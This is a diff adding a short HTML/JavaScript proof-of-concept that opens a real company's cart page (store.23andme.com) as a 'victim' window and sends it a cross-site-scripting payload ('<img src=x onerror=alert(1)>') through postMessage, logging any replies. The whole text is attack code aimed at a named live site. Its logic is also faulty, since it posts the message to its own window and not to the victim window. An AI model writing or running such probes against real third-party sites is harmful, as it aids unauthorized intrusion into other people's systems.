@@ -1,0 +1,14 @@
+<script>
+window.onload = () => {
+    // إرسال رسالة إلى الصفحة الهدف
+    window.open("https://store.23andme.com/en-us/cart/", "victimWin");
+    setTimeout(() => {
+        window.postMessage({type:"XSS_TEST",payload:"<img src=x onerror=alert(1)>"},"*");
+    }, 2000);
+};
+
+window.addEventListener("message", (event) => {
+    console.log("Received message from victim:", event.origin, event.data);
+});
+</script>
+
